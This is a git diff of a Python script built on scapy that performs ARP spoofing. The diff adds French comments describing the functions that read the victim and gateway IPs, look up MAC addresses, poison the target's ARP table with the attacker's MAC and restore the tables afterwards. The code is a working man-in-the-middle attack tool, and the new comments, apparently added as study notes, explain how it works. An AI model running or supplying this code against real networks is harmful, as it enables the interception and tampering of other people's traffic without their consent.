@@ -4,12 +4,14 @@ import argparse
 import time
 import sys
 
+# Cette fonction récupère les arguments: -t pour target (victime) et -g pour le gateway
 def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target", dest="target", help="Specify target ip")
     parser.add_argument("-g", "--gateway", dest="gateway", help="Specify spoof ip")
     return parser.parse_args()
 
+# Cette fonction récupère l'@ physique à partir de l'@ IP, une simple requête ARP
 def get_mac(ip):
     arp_packet = scapy.ARP(pdst=ip)
     broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -22,14 +24,16 @@ def get_mac(ip):
         #print(answered_list)
         print(answered_list.show())
 
-    return answered_list[0][1].hwsrc
+    return answered_list[0][1].hwsrc # hwsrc désigne l'@ physique contenu dans le paquet réponse.
 
+# Cette fonction restore les tables ARP du Gateway et de la victime à la normale
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, 4)
 
+# Cette fonction empoisonne la table ARP de target_ip en me mettant mon @Mac en correspondance avec l'@ IP spoof_ip 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
